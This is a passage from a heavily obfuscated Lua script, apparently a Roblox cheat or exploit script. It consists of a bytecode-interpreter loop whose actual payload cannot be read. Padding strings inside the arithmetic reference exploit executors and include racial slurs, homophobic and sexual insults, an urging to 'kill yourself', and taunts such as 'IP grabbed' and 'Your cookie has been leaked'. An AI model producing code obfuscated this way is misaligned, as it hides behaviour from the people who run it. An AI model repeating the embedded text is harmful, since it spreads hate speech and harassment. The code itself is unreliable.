muahahahahahaha"))do l[e[w]][e[t]]=e[S];break end;break;end while(d)/((0x171+-125))==2843 do d=(9233784)while(-#'sussy chat sussy sussy'+(176-0x95))<r do d-= d local r;local D;local d;l[e[k]]=l[e[O]][e[N]];o=o+n;e=a[o];l[e[f]]=l[e[u]][e[S]];o=o+n;e=a[o];l[e[k]]=l[e[s]][e[B]];o=o+n;e=a[o];d=e[x];D=l[e[t]];l[d+1]=D;l[d]=D[e[M]];o=o+n;e=a[o];l[e[x]]=e[U];o=o+n;e=a[o];d=e[c]l[d]=l[d](P(l,d+n,e[O]))o=o+n;e=a[o];l[e[k]]=l[e[t]][e[S]];o=o+n;e=a[o];l[e[c]]=l[e[O]][e[S]];o=o+n;e=a[o];l[e[b]]=m[e[u]];o=o+n;e=a[o];l[e[x]]=l[e[U]][e[B]];o=o+n;e=a[o];l[e[c]]=e[O];o=o+n;e=a[o];l[e[f]]=e[O];o=o+n;e=a[o];l[e[x]]=e[U];o=o+n;e=a[o];d=e[k]l[d]=l[d](P(l,d+n,e[s]))o=o+n;e=a[o];r={l,e};r[i][r[_][f]]=r[n][r[_][C]]+r[i][r[_][h]];o=o+n;e=a[o];d=e[w]l[d](l[d+i])o=o+n;e=a[o];o=e[h];break end while 3546==(d)/(((420371/0xa1)+-#[[nigglet]]))do o=e[u];break end;break;end break;end break;end while 3479==(d)/((7610-0xeef))do d=(4742388)while r<=(0x8f7/255)do d-= d d=(5957974)while(83+-0x4c)>=r do d-= d local e=e[b]l[e]=l[e](P(l,e+n,D))break;end while 2531==(d)/((0x988+-86))do d=(125624)while((88-0x4b)+-#'negus')<r do d-= d local d=e[h];local o=l[d]for e=d+1,e[N]do o=o..l[e];end;l[e[w]]=o;break end while(d)/((-#[[Rip Technoblade but he truly never dies in our hearts]]+(3192-0x647)))==82 do l[e[f]]();break end;break;end break;end while(d)/((58548/0x2a))==3402 do d=(3535470)while r<=((6720/0x78)+-#"testpsx dupe no scam legit 2022 free no virus")do d-= d d=(1543770)while(-#[[whats up]]+(-93+0x6f))<r do d-= d l[e[b]][e[h]]=l[e[M]];break end while 3027==(d)/((-0x6e+(-32+0x28c)))do local d;local r;local w,O;local k;local d;d=e[x];k=l[e[u]];l[d+1]=k;l[d]=k[e[C]];o=o+n;e=a[o];l[e[b]]=e[t];o=o+n;e=a[o];d=e[c]l[d]=l[d](P(l,d+n,e[h]))o=o+n;e=a[o];d=e[f];k=l[e[s]];l[d+1]=k;l[d]=k[e[g]];o=o+n;e=a[o];d=e[b]w,O=y(l[d](l[d+i]))D=O+d-n r=0;for e=d,D do r=r+n;l[e]=w[r];end;o=o+n;e=a[o];d=e[x]w={l[d](P(l,d+1,D))};r=0;for e=d,e[N]do r=r+n;l[e]=w[r];end o=o+n;e=a[o];o=e[U];break end;break;end while(d)/((-117+0xa02))==1446 do d=(2433281)while(-#'fix vg hub dekudimz'+(84-0x35))<r do d-= d local d;local r;local w,U;local k;local d;d=e[x];k=l[e[u]];l[d+1]=k;l[d]=k[e[g]];o=o+n;e=a[o];l[e[f]]=e[h];o=o+n;e=a[o];d=e[c]l[d]=l[d](P(l,d+n,e[s]))o=o+n;e=a[o];l[e[c]]=l[e[u]][e[N]];o=o+n;e=a[o];l[e[x]]=m[e[t]];o=o+n;e=a[o];d=e[c];k=l[e[s]];l[d+1]=k;l[d]=k[e[g]];o=o+n;e=a[o];d=e[b]w,U=y(l[d](l[d+i]))D=U+d-n r=0;for e=d,D do r=r+n;l[e]=w[r];end;o=o+n;e=a[o];d=e[x]w={l[d](P(l,d+1,D))};r=0;for e=d,e[M]do r=r+n;l[e]=w[r];end o=o+n;e=a[o];o=e[h];break end while 2671==(d)/((-#'if syn request then print your mom then end and then kill yourself'+(120171/((390-0xd5)+-#[[Never fading and I know the haters are forever waiting]]))))do local d=e[b];local r=e[S];local a=d+2 local d={l[d](l[d+1],l[a])};for e=1,r do l[a+e]=d[e];end;local d=d[1]if d then l[a]=d o=e[u];else o=o+n;end;break end;break;end break;end break;end break;end while 1802==(d)/((-100+0x6f1))do d=(11408600)while((-0x61+140)+-#"how do i get moonsex v3")>=r do d-= d d=(7080205)while r<=(-#'iPipeh Is My god'+(5280/0xa5))do d-= d d=(1343136)while r<=(560/0x28)do d-= d l[e[k]]=e[t];break;end while 816==(d)/((3355-0x6ad))do d=(3044275)while((0x2e38/204)-43)<r do d-= d l[e[c]]=l[e[h]][e[S]];break end while 2755==(d)/(((0x5514/18)+-#'local ballsack equals game dot players dot local player dot character dot humanoid dot torso dot ballsack'))do l[e[f]][l[e[t]]]=l[e[S]];break end;break;end break;end while 3335==(d)/((-80+0x89b))do d=(8405152)while(-126+0x90)>=r do d-= d d=(3822830)while r>(0x6f-94)do d-= d if not l[e[x]]then o=o+i;else o=e[h];end;break end while 1265==(d)/((3141+-0x77))do local d=e[h];local o=l[d]for e=d+1,e[M]do o=o..l[e];end;l[e[c]]=o;break end;break;end while 2198==(d)/((0xf61+-113))do d=(165908)while(-#[[Pyrite On Top]]+(1856/0x3a))<r do d-= d local e=e[f]l[e]=l[e]()break end while 2812==(d)/(((0x1fb8/116)+-#[[Quiero pene]]))do if(l[e[c]]==l[e[M]])then o=o+i;else o=e[h];end;break end;break;end break;end break;end while(d)/((0x1f0f-4017))==2900 do d=(4213833)while((-#"IP grabbed"+(-148+0x2e))+0x88)>=r do d-= d d=(3400520)while(78-0x38)>=r do d-= d d=(2001672)while(-#'impulse reel pastebin'+(-0x36+96))<r do d-= d if(l[e[f]]==e[B])then o=o+i;else o=e[t];end;break end while(d)/((((-124+0x12)+-#[[I hate black people]])+773))==3089 do local d;local r;local _,M;local O;local d;l[e[x]]();o=o+n;e=a[o];l[e[x]]=m[e[u]];o=o+n;e=a[o];d=e[f];O=l[e[u]];l[d+1]=O;l[d]=O[e[S]];o=o+n;e=a[o];l[e[w]]=e[t];o=o+n;e=a[o];d=e[c]l[d]=l[d](P(l,d+n,e[s]))o=o+n;e=a[o];l[e[c]][e[s]]=e[C];o=o+n;e=a[o];l[e[k]]=m[e[u]];o=o+n;e=a[o];l[e[b]]=l[e[s]];o=o+n;e=a[o];d=e[b]l[d]=l[d]()o=o+n;e=a[o];d=e[c];O=l[e[U]];l[d+1]=O;l[d]=O[e[C]];o=o+n;e=a[o];d=e[k]_,M=y(l[d](l[d+i]))D=M+d-n r=0;for e=d,D do r=r+n;l[e]=_[r];end;o=o+n;e=a[o];d=e[b]_={l[d](P(l,d+1,D))};r=0;for e=d,e[B]do r=r+n;l[e]=_[r];end o=o+n;e=a[o];o=e[h];break end;break;end while(d)/((0x92f+-99))==1510 do d=(7779772)while r>((0x41a/21)+-#[[Nsrds GAYYYYAIAHAKAJAVAHAUA]])do d-= d l[e[x]][e[h]]=e[C];break end while(d)/((-21+0xdb1))==2233 do o=e[O];break end;break;end break;end while(d)/((-#[[if syn then syn dot request get beliveri12 coma nicuse ass end]]+(8275-0x1064)))==1049 do d=(655690)while(69-0x2b)>=r do d-= d d=(1757700)while((11772/0xda)+-#'Only A to Z 0 to 9 is allowed')<r do d-= d local o=e[x];local d=l[e[h]];l[o+1]=d;l[o]=d[e[C]];break end while 3780==(d)/(((((8208552/0x44)+-#[[Faggot]])/252)+-#[[FranzJPresents]]))do l[e[b]]=(e[h]~=0);break end;break;end while(d)/((-0x16+2487))==266 do d=(7351590)while(-37+0x40)<r do d-= d local d;d=e[f]l[d](P(l,d+i,e[U]))o=o+n;e=a[o];l[e[w]]=m[e[s]];o=o+n;e=a[o];d=e[c]l[d]=l[d]()o=o+n;e=a[o];l[e[k]][e[U]]=l[e[B]];o=o+n;e=a[o];l[e[w]]=m[e[u]];o=o+n;e=a[o];l[e[f]]=l[e[t]][e[B]];o=o+n;e=a[o];l[e[c]]=e[O];o=o+n;e=a[o];l[e[c]]=e[U];o=o+n;e=a[o];l[e[k]]=e[s];o=o+n;e=a[o];l[e[x]]=e[s];o=o+n;e=a[o];l[e[w]]=e[t];o=o+n;e=a[o];l[e[c]]=e[t];o=o+n;e=a[o];l[e[c]]=e[O];o=o+n;e=a[o];l[e[c]]=e[O];o=o+n;e=a[o];l[e[c]]=e[t];o=o+n;e=a[o];l[e[b]]=e[s];o=o+n;e=a[o];l[e[c]]=e[h];o=o+n;e=a[o];l[e[k]]=e[O];o=o+n;e=a[o];d=e[k]l[d]=l[d](P(l,d+n,e[h]))o=o+n;e=a[o];l[e[c]]=m[e[O]];o=o+n;e=a[o];d=e[x]l[d]=l[d]()o=o+n;e=a[o];l[e[x]]=l[e[h]][e[M]];o=o+n;e=a[o];if(l[e[b]]==e[C])then o=o+i;else o=e[U];end;break end while 3849==(d)/((-0x76+2028))do do return l[e[f]]end break end;break;end break;end break;end break;end break;end while(d)/((0x1e3c-3914))==3784 do d=(3870548)while((-96+0xbc)+-#[[Uh summa lumma dooma lumma you assumin Im a human]])>=r do d-= d d=(3189654)while(0x96+-115)>=r do d-= d d=(9951810)while((12550/(0x152+-87))+-#[[nicuse is nil skull]])>=r do d-= d d=(1273532)while((-0x43+109)+-#"tunnelposting")>=r do d-= d do return end;break;end while 988==(d)/(((293122/0xe2)+-#"lego hax"))do d=(7210749)while(-#[[hol on leme chec ur seirc histori toll]]+(0x2244/129))<r do d-= d l[e[c]]=p[e[h]];o=o+n;e=a[o];l[e[b]]=#l[e[U]];o=o+n;e=a[o];p[e[u]]=l[e[k]];o=o+n;e=a[o];l[e[x]]=p[e[t]];o=o+n;e=a[o];l[e[x]]=#l[e[u]];o=o+n;e=a[o];p[e[h]]=l[e[x]];o=o+n;e=a[o];do return end;break end while(d)/((((-0x47+4886)-0x977)+-#[[Big black men]]))==3031 do l[e[k]]=#l[e[h]];break end;break;end break;end while 3414==(d)/((0x16f7-2964))do d=(4258166)while r<=(137-0x68)do d-= d d=(11316096)while(-#"Uh summa lumma dooma lumma you assumin Im a human"+((-#"atakan der nigga"+(2544926/0x92))/0xd7))<r do d-= d local r;local t;local d;l[e[w]]=l[e[s]][e[C]];o=o+n;e=a[o];d=e[f];t=l[e[h]];l[d+1]=t;l[d]=t[e[C]];o=o+n;e=a[o];l[e[b]]=e[s];o=o+n;e=a[o];d=e[c]l[d]=l[d](P(l,d+n,e[U]))o=o+n;e=a[o];l[e[c]]=l[e[u]][e[C]];o=o+n;e=a[o];l[e[k]]=m[e[h]];o=o+n;e=a[o];l[e[f]]=l[e[h]][e[N]];o=o+n;e=a[o];l[e[x]]=e[O];o=o+n;e=a[o];l[e[w]]=e[u];o=o+n;e=a[o];l[e[k]]=e[s];o=o+n;e=a[o];d=e[b]l[d]=l[d](P(l,d+n,e[u]))o=o+n;e=a[o];r={l,e};r[i][r[_][c]]=r[n][r[_][B]]+r[i][r[_][s]];o=o+n;e=a[o];d=e[c]l[d](l[d+i])break end while 3102==(d)/((-#"ratio no one cares yo momma dead yo daddy left"+(7460-0xeb6)))do local d=e[b];local r=e[B];local a=d+2 local d={l[d](l[d+1],l[a])};for e=1,r do l[a+e]=d[e];end;local d=d[1]if d then l[a]=d o=e[t];else o=o+n;end;break end;break;end while 1837==(d)/((-118+0x984))do d=(5780425)while(((396-0xf3)+-#[[sussy]])-114)<r do d-= d l[e[b]]();o=o+n;e=a[o];l[e[c]]=m[e[u]];o=o+n;e=a[o];l[e[f]]=l[e[u]][e[N]];o=o+n;e=a[o];l[e[x]]=l[e[O]][e[M]];o=o+n;e=a[o];l[e[k]]=l[e[O]][e[M]];o=o+n;e=a[o];l[e[x]]=l[e[h]][e[g]];o=o+n;e=a[o];l[e[x]]=m[e[u]];o=o+n;e=a[o];l[e[b]]=l[e[O]][e[M]];o=o+n;e=a[o];l[e[c]]=m[e[t]];o=o+n;e=a[o];l[e[w]]=l[e[U]][l[e[S]]];o=o+n;e=a[o];l[e[w]]=l[e[t]][e[g]];o=o+n;e=a[o];l[e[b]]=l[e[U]][e[C]];o=o+n;e=a[o];l[e[b]]=l[e[t]][e[g]];o=o+n;e=a[o];l[e[k]][e[O]]=l[e[C]];o=o+n;e=a[o];o=e[u];break end while(d)/((-#'Zapperqr is leaker'+(0xda9-1804)))==3451 do local d;local r;local s,O;local f;local d;l[e[w]]=m[e[U]];o=o+n;e=a[o];l[e[x]]=m[e[h]];o=o+n;e=a[o];d=e[c];f=l[e[h]];l[d+1]=f;l[d]=f[e[S]];o=o+n;e=a[o];l[e[b]]=e[t];o=o+n;e=a[o];d=e[x]l[d]=l[d](P(l,d+n,e[t]))o=o+n;e=a[o];l[e[w]]=l[e[t]][e[N]];o=o+n;e=a[o];l[e[b]]=l[e[u]][e[B]];o=o+n;e=a[o];l[e[c]]=l[e[u]][e[M]];o=o+n;e=a[o];d=e[w];f=l[e[u]];l[d+1]=f;l[d]=f[e[S]];o=o+n;e=a[o];d=e[k]s,O=y(l[d](l[d+i]))D=O+d-n r=0;for e=d,D do r=r+n;l[e]=s[r];end;o=o+n;e=a[o];d=e[x]s={l[d](P(l,d+1,D))};r=0;for e=d,e[N]do r=r+n;l[e]=s[r];end o=o+n;e=a[o];o=e[U];break end;break;end break;end break;end while(d)/((0x2ada6/(343-0xba)))==2853 do d=(702325)while r<=(-74+0x71)do d-= d d=(695268)while(-#'El pepe'+(160+((-11748/0x84)+-#[[Your cookie has been leaked]])))>=r do d-= d d=(740715)while r>((0x54b4/156)-103)do d-= d local o=e[f]l[o]=l[o](P(l,o+n,e[O]))break end while(d)/((68970/0xf2))==2599 do local r;local d;d=e[f];r=l[e[U]];l[d+1]=r;l[d]=r[e[N]];o=o+n;e=a[o];l[e[k]]=e[O];o=o+n;e=a[o];d=e[c]l[d]=l[d](P(l,d+n,e[u]))o=o+n;e=a[o];l[e[w]]=l[e[h]][e[M]];o=o+n;e=a[o];l[e[c]]=l[e[U]][e[B]];o=o+n;e=a[o];l[e[x]]=l[e[t]][e[C]];o=o+n;e=a[o];l[e[w]]=l[e[U]][e[g]];o=o+n;e=a[o];l[e[k]]=l[e[t]][e[B]];o=o+n;e=a[o];if(l[e[x]]==e[M])then o=o+i;else o=e[h];end;break end;break;end while(d)/((-#[[fun fact if you want to say discord just type Discord with a capital D boom]]+(1961-0x3fa)))==801 do d=(1202985)while(0x23a0/240)<r do d-= d local d;local r;local c,b;local x;local d;l[e[f]]=m[e[O]];o=o+n;e=a[o];l[e[f]]=p[e[u]];o=o+n;e=a[o];d=e[k]l[d]=l[d]()o=o+n;e=a[o];d=e[w];x=l[e[h]];l[d+1]=x;l[d]=x[e[S]];o=o+n;e=a[o];d=e[k]c,b=y(l[d](l[d+i]))D=b+d-n r=0;for e=d,D do r=r+n;l[e]=c[r];end;o=o+n;e=a[o];d=e[w]c={l[d](P(l,d+1,D))};r=0;for e=d,e[B]do r=r+n;l[e]=c[r];end o=o+n;e=a[o];o=e[t];break end while(d)/(((1736/(0x15a/173))+-#[[Daddy fuck me]]))==1407 do l[e[c]][l[e[u]]]=l[e[g]];break end;break;end break;end while 2161==(d)/(((0xd28d/159)+-#'i love tatakai'))do d=(4097730)while(-113+0x9a)>=r do d-= d d=(5992920)while(181-0x8d)<r do d-= d l[e[b]]=m[e[U]];o=o+n;e=a[o];l[e[w]]=l[e[s]][e[S]];o=o+n;e=a[o];l[e[f]]=l[e[u]][e[g]];o=o+n;e=a[o];l[e[w]]=l[e[u]][e[C]];o=o+n;e=a[o];l[e[x]]=l[e[U]][e[M]];o=o+n;e=a[o];l[e[f]]=m[e[u]];o=o+n;e=a[o];l[e[b]]=l[e[h]][e[B]];o=o+n;e=a[o];l[e[k]]=m[e[h]];o=o+n;e=a[o];l[e[f]]=l[e[h]][l[e[N]]];o=o+n;e=a[o];l[e[c]]=l[e[U]][e[g]];o=o+n;e=a[o];l[e[w]]=l[e[t]][e[N]];o=o+n;e=a[o];l[e[w]]=l[e[s]][e[M]];o=o+n;e=a[o];l[e[c]][e[t]]=l[e[C]];o=o+n;e=a[o];do return end;break end while 3580==(d)/(((208680/0x78)+-0x41))do local e=e[w]l[e](l[e+i])break end;break;end while 3990==(d)/((-#'this video is sponsored by manscaped your balls will thank you'+(0x8a7-1126)))do d=(1905912)while(0x8f-101)<r do d-= d local e={l,e};e[i][e[_][w]]=e[n][e[_][N]]+e[i][e[_][O]];break end while(d)/((0x69a-(-#[[pairu sucks dick]]+(0xedba/69))))==2313 do p[e[s]]=l[e[c]];break end;break;end break;end break;end break;end while 1331==(d)/(((0x90525/201)+-#[[i would jerk off to federals feet]]))do d=(4019925)while r<=((0xe5-168)+-#[[mysecondegg]])do d-= d d=(16032714)while((544870/0x73)/103)>=r do d-= d d=(9762768)while(66+-0x16)>=r do d-= d local d;local r;local t,k;local b;local d;l[e[c]]=m[e[U]];o=o+n;e=a[o];d=e[x];b=l[e[U]];l[d+1]=b;l[d]=b[e[C]];o=o+n;e=a[o];d=e[w]t,k=y(l[d](l[d+i]))D=k+d-n r=0;for e=d,D do r=r+n;l[e]=t[r];end;o=o+n;e=a[o];d=e[c]t={l[d](P(l,d+1,D))};r=0;for e=d,e[S]do r=r+n;l[e]=t[r];end o=o+n;e=a[o];o=e[h];break;end while(d)/(((0x6f987/155)+-#'moon sex is better than lua guard'))==3348 do d=(4298050)while r>((0x674/28)+-#[[FranzJPresents]])do d-= d l[e[b]]=l[e[O]]%e[N];break end while 3350==(d)/(((-#"real roblox omg builderman caught playing real"+(5545-0xb10))-0x568))do m[e[h]]=l[e[c]];break end;break;end break;end while(d)/((149986/0x26))==4062 do d=(570876)while r<=(-0x35+101)do d-= d d=(914167)while(0x1a70/144)<r do d-= d l[e[b]]={};break end while 841==(d)/((-0x35+(-#[[Negro]]+(-49+0x4aa))))do l[e[f]]=l[e[s]]%e[S];break end;break;end while(d)/((0xf64e/186))==1684 do d=(8545602)while r>(173+-0x7c)do d-= d if l[e[k]]then o=o+n;else o=e[s];end;break end while(d)/((-#"Uh summa lumma dooma lumma you assumin Im a human"+(0x12b0-2421)))==3693 do l[e[c]][e[s]]=l[e[M]];break end;break;end break;end break;end while 3255==(d)/(((0x557+-126)+-#[[uhhhhh]]))do d=(2635274)while(115+-0x3d)>=r do d-= d d=(8822352)while r<=(-73+0x7d)do d-= d d=(700350)while r>(-91+0x8e)do d-= d l[e[k]]=(e[h]~=0);break end while 1450==(d)/((-111+0x252))do l[e[x]]=p[e[O]];break end;break;end while 3472==(d)/((-49+0xa1e))do d=(5946250)while r>((11084/0xa3)+-#'W4rboy was here')do d-= d local r;local d;d=e[w];r=l[e[U]];l[d+1]=r;l[d]=r[e[M]];o=o+n;e=a[o];l[e[w]]=e[O];o=o+n;e=a[o];d=e[f]l[d]=l[d](P(l,d+n,e[h]))o=o+n;e=a[o];l[e[x]]=l[e[s]][e[S]];o=o+n;e=a[o];l[e[x]]=l[e[U]][e[M]];o=o+n;e=a[o];l[e[k]]=l[e[t]][e[C]];o=o+n;e=a[o];l[e[c]]=l[e[s]][e[B]];o=o+n;e=a[o];l[e[f]]=l[e[O]][e[B]];o=o+n;e=a[o];if(l[e[c]]~=e[g])then o=o+i;else o=e[u];end;break end while 1675==(d)/((-0x66+((0xeb3+-65)+-#"blinx1 is a sissy little femboy that loves men")))do local d;local r;local u,O;local k;local d;l[e[x]]=m[e[s]];o=o+n;e=a[o];l[e[c]]=m[e[U]];o=o+n;e=a[o];d=e[x];k=l[e[t]];l[d+1]=k;l[d]=k[e[g]];o=o+n;e=a[o];l[e[f]]=e[h];o=o+n;e=a[o];d=e[w]l[d]=l[d](P(l,d+n,e[U]))o=o+n;e=a[o];l[e[x]]=l[e[t]][e[S]];o=o+n;e=a[o];l[e[b]]=l[e[h]][e[M]];o=o+n;e=a[o];l[e[w]]=l[e[h]][e[S]];o=o+n;e=a[o];d=e[c];k=l[e[s]];l[d+1]=k;l[d]=k[e[S]];o=o+n;e=a[o];d=e[f]u,O=y(l[d](l[d+i]))D=O+d-n r=0;for e=d,D do r=r+n;l[e]=u[r];end;o=o+n;e=a[o];d=e[c]u={l[d](P(l,d+1,D))};r=0;for e=d,e[M]do r=r+n;l[e]=u[r];end o=o+n;e=a[o];o=e[U];break end;break;end break;end while 1478==(d)/((367298/0xce))do d=(1256720)while(0x1ce0/132)>=r do d-= d d=(111972)while(0x4b+(-#'negus'+(88+-0x67)))<r do d-= d local e=e[k]l[e]=l[e](l[e+i])break end while 3612==(d)/((0x5f-64))do l[e[w]]=m[e[U]];break end;break;end while(d)/(((81744/0xd0)+-#"ive seen your mothers ass"))==3415 do d=(3907007)while(-#"zxcvbnm"+(147+-0x53))<r do d-= d local r;local d;d=e[b];r=l[e[O]];l[d+1]=r;l[d]=r[e[B]];o=o+n;e=a[o];l[e[x]]=e[O];o=o+n;e=a[o];d=e[w]l[d]=l[d](P(l,d+n,e[s]))o=o+n;e=a[o];l[e[c]]=l[e[u]][e[M]];o=o+n;e=a[o];l[e[f]]=l[e[t]][e[N]];o=o+n;e=a[o];l[e[w]]=l[e[u]][e[M]];o=o+n;e=a[o];l[e[c]]=l[e[U]][e[N]];o=o+n;e=a[o];l[e[b]]=l[e[h]][e[M]];o=o+n;e=a[o];if(l[e[k]]~=e[B])then o=o+i;else o=e[s];end;break end while 1109==(d)/((0xc943e/234))do local o=e[c]local d,e=y(l[o](P(l,o+1,e[t])))D=e+o-1 local e=0;for o=o,D do e=e+n;l[o]=d[e];end;break end;break;end break;end break;end break;end break;end break;end while 1078==(d)/((0x7011/219))do d=(997578)while r<=(-#'2406924069240 your mom is gay af lol'+(-0x3b+183))do d-= d d=(3225194)while(18031/0xf7)>=r do d-= d d=(2019792)while(-0x65+166)>=r do d-= d d=(161382)while r<=(-108+(-#'FranzJPresents'+(491-0x134)))do d-= d d=(405468)while r<=(0x2fb5/207)do d-= d l[e[c]]=l[e[u]][l[e[C]]];break;end while(d)/((0x253-343))==1609 do d=(589620)while r>((0x2693/125)+-#[[made by kim jong un]])do d-= d l[e[b]]=l[e[u]][l[e[M]]];break end while(d)/((0x71ec/92))==1860 do local d;local r;local h,O;local x;local d;l[e[b]]=m[e[s]];o=o+n;e=a[o];l[e[k]]=m[e[U]];o=o+n;e=a[o];d=e[c];x=l[e[t]];l[d+1]=x;l[d]=x[e[B]];o=o+n;e=a[o];l[e[b]]=e[s];o=o+n;e=a[o];d=e[c]l[d]=l[d](P(l,d+n,e[s]))o=o+n;e=a[o];l[e[b]]=l[e[s]][e[C]];o=o+n;e=a[o];d=e[w];x=l[e[s]];l[d+1]=x;l[d]=x[e[g]];o=o+n;e=a[o];d=e[f]h,O=y(l[d](l[d+i]))D=O+d-n r=0;for e=d,D do r=r+n;l[e]=h[r];end;o=o+n;e=a[o];d=e[f]h={l[d](P(l,d+1,D))};r=0;for e=d,e[M]do r=r+n;l[e]=h[r];end o=o+n;e=a[o];o=e[u];break end;break;end break;end while(d)/((-0x57+165))==2069 do d=(587001)while(201-0x8a)>=r do d-= d d=(14185992)while(8866/0x8f)<r do d-= d if(l[e[c]]==e[M])then o=o+i;else o=e[U];end;break end while 3576==(d)/((0x1f74-4085))do l[e[x]]=m[e[s]];o=o+n;e=a[o];l[e[k]]=l[e[U]][e[g]];o=o+n;e=a[o];l[e[x]]=l[e[u]][e[M]];o=o+n;e=a[o];l[e[f]]=l[e[h]][e[M]];o=o+n;e=a[o];if(l[e[x]]~=l[e[g]])then o=o+i;else o=e[U];end;break end;break;end while(d)/(((0x3e7-561)+-#"Uh summa lumma dooma lumma you assumin Im a human"))==1509 do d=(12318156)while(0x5c+-28)<r do d-= d l[e[x]]=p[e[s]];break end while(d)/(((0x39d7d/75)+-#[[goofy ahh uncle productions]]))==3933 do local e={l,e};e[i][e[_][b]]=e[n][e[_][N]]+e[i][e[_][u]];break end;break;end break;end break;end while 1451==(d)/((0xb4a-1498))do d=(3655568)while(0xa9-100)>=r do d-= d d=(2039556)while r<=(207-0x8c)do d-= d d=(5904012)while(-#'while wait 1 do print deez end'+(0x11d-189))<r do d-= d local r;local d;l[e[c]]=m[e[t]];o=o+n;e=a[o];d=e[b];r=l[e[t]];l[d+1]=r;l[d]=r[e[C]];o=o+n;e=a[o];l[e[b]]=m[e[u]];o=o+n;e=a[o];l[e[f]]=l[e[t]][e[C]];o=o+n;e=a[o];l[e[k]]=e[h];o=o+n;e=a[o];l[e[c]]=e[O];o=o+n;e=a[o];d=e[x]l[d]=l[d](P(l,d+n,e[h]))o=o+n;e=a[o];l[e[k]]=m[e[t]];o=o+n;e=a[o];l[e[x]]=l[e[s]][e[S]];o=o+n;e=a[o];l[e[f]]=l[e[O]][e[g]];o=o+n;e=a[o];d=e[k]l[d](P(l,d+i,e[s]))o=o+n;e=a[o];l[e[b]]=m[e[t]];o=o+n;e=a[o];l[e[k]]=e[s];o=o+n;e=a[o];d=e[f]l[d](l[d+i])o=o+n;e=a[o];l[e[c]]=m[e[U]];o=o+n;e=a[o];d=e[k];r=l[e[O]];l[d+1]=r;l[d]=r[e[M]];o=o+n;e=a[o];l[e[x]]=m[e[h]];o=o+n;e=a[o];l[e[f]]=l[e[t]][e[C]];o=o+n;e=a[o];l[e[f]]=e[U];o=o+n;e=a[o];l[e[b]]=e[U];o=o+n;e=a[o];d=e[c]l[d]=l[d](P(l,d+n,e[t]))o=o+n;e=a[o];l[e[w]]=m[e[u]];o=o+n;e=a[o];l[e[x]]=l[e[t]][e[C]];o=o+n;e=a[o];l[e[x]]=l[e[u]][e[N]];o=o+n;e=a[o];d=e[f]l[d](P(l,d+i,e[h]))o=o+n;e=a[o];do return end;break end while 1614==(d)/((0xe5e+-20))do l[e[b]]=l[e[O]]-l[e[M]];break end;break;end while(d)/((0x59a+-38))==1461 do d=(3055248)while r>(216-0x94)do d-= d l[e[f]]={};break end while(d)/((0x39820/136))==1764 do m[e[u]]=l[e[c]];o=o+n;e=a[o];l[e[f]]={};o=o+n;e=a[o];l[e[f]]={};o=o+n;e=a[o];m[e[u]]=l[e[f]];o=o+n;e=a[o];l[e[w]]=m[e[t]];o=o+n;e=a[o];if(l[e[w]]==e[S])then o=o+i;else o=e[U];end;break end;break;end break;end while 1778==(d)/((2170+(-39+-0x4b)))do d=(3768080)while(-76+0x93)>=r do d-= d d=(4885566)while r>((15950/0x91)+-#[[Cause I know the way to get em motivated]])do d-= d local c=j[e[t]];local r;local d={};r=F({},{__index=function(o,e)local e=d[e];return e[1][e[2]];end,__newindex=function(l,e,o)local e=d[e]e[1][e[2]]=o;end;});for n=1,e[N]do o=o+i;local e=a[o];if e[((51/0x3)+-#'pairu sucks dick')]==82 then d[n-1]={l,e[u]};else d[n-1]={p,e[O]};end;I[#I+1]=d;end;l[e[k]]=v(c,r,m);break end while(d)/((-48+0x54b))==3738 do p[e[O]]=l[e[k]];break end;break;end while 1480==(d)/((((667766/0xfe)+-#[[papier der afghaner wurde von nice dem bombenleger gefickt]])+-0x19))do d=(2826900)while(250-0xb2)<r do d-= d local d=e[x];local o=l[e[s]];l[d+1]=o;l[d]=o[e[S]];break end while 698==(d)/((0x1fc5-(0x2010-4125)))do local o=e[c]l[o](P(l,o+i,e[h]))break end;break;end break;end break;end break;end while(d)/((1528+-0x1e))==2153 do d=(7590660)while r<=(0xb90/37)do d-= d d=(2690019)while((193+-0x68)+-#[[Bush Did 9 11]])>=r do d-= d d=(950014)while r<=(0xd96/47)do d-= d local d=e[c];local a=l[d+2];local n=l[d]+a;l[d]=n;if(a>0)then if(n<=l[d+1])then o=e[O];l[d+3]=n;end elseif(n>=l[d+1])then o=e[O];l[d+3]=n;end break;end while 599==(d)/((0x9ae2/25))do d=(276225)while(-79+0x9a)<r do d-= d l[e[k]]=l[e[h]]-l[e[N]];break end while 3175==(d)/((203+-0x74))do if(l[e[w]]~=l[e[C]])then o=o+i;else o=e[U];end;break end;break;end break;end while 2313==(d)/((172124/0x94))do d=(5480520)while r<=((644+-0x14)/8)do d-= d d=(6995976)while r>((12672/0x80)+-#[[windows xp startup sfx]])do d-= d local r;local d;l[e[w]]=p[e[U]];o=o+n;e=a[o];d=e[c];r=l[e[U]];l[d+1]=r;l[d]=r[e[B]];o=o+n;e=a[o];l[e[x]]=m[e[t]];o=o+n;e=a[o];d=e[w]l[d](P(l,d+i,e[u]))o=o+n;e=a[o];do return end;break end while 2652==(d)/((0x14f7-2729))do local e=e[b]local d,o=y(l[e](l[e+i]))D=o+e-n local o=0;for e=e,D do o=o+n;l[e]=d[o];end;break end;break;end while(d)/((2206+-0x6f))==2616 do d=(1117584)while(0xb9-((219+-0x5f)+-#"Impulse youtube ez"))<r do d-= d l[e[b]]=l[e[t]][e[S]];break end while(d)/((-94+0x20e))==2587 do local o=e[w]l[o](P(l,o+i,e[t]))break end;break;end break;end break;end while 3286==(d)/((344190/0x95))do d=(8926690)while r<=(-51+0x87)do d-= d d=(3989746)while r<=(-0x18+106)do d-= d d=(292734)while r>(0x70+-31)do d-= d l[e[f]]=l[e[t]];break end while(d)/((13122/0x51))==1807 do local o=e[x]local d,e=y(l[o](P(l,o+1,e[u])))D=e+o-1 local e=0;for o=o,D do e=e+n;l[o]=d[e];end;break end;break;end while(d)/(((-0x31+-34)+0x7a5))==2129 do d=(2334540)while r>(0x11c-201)do d-= d l[e[b]]=v(j[e[h]],nil,m);break end while 780==(d)/((0x511bf/111))do m[e[s]]=l[e[x]];break end;break;end break;end while(d)/((86970/0x27))==4003 do d=(8472240)while(18748/0xda)>=r do d-= d d=(8063718)while r>(202-0x75)do d-= d if(l[e[w]]~=e[S])then o=o+i;else o=e[t];end;break end while 2613==(d)/((-#"send nudes"+(427248/0x8a)))do local d=e[w];local n=l[d]local a=l[d+2];if(a>0)then if(n>l[d+1])then o=e[U];else l[d+3]=n;end elseif(n<l[d+1])then o=e[t];else l[d+3]=n;end break end;break;end while(d)/((0x70e90/141))==2583 do d=(6766)while r>(-#"while wait 1 do print deez end"+(274-0x9d))do d-= d local 